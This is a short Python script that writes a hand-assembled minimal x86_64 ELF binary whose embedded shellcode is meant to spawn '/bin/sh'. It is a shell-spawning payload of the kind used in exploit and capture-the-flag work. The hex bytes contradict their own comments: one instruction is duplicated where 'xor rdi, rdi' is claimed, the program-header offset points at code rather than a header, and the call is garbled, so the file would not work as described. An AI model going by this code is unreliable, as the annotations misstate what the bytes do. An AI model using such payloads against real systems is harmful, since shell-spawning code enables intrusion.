# make.py
with open("elf_payload", "wb") as f:
    f.write(bytes.fromhex(
        "7f454c46020101000000000000000000"  # ELF Header (first 16 bytes)
        "02003e00010000007800000000000000"  # Type=EXEC, Machine=x86_64, Entry=0x78
        "40000000000000000000000000000000"  # PH offset = 0x40
        "00000000000000004000000000000000"  # Start of section header = 0 (unused)
        "00000000000000000000000000000000"  # Flags and sizes = 0 (minimal)
        "00000000000000004831f64831d24831"  # Code starts here: xor rsi, rsi; xor rdx, rdx; xor rdi, rdi
        "d2b03b0f05e82effffff2f62696e2f73"  # mov al, 59; syscall; call into "/bin/sh"
        "6800"                              # "/bin/sh\x00"
    ))
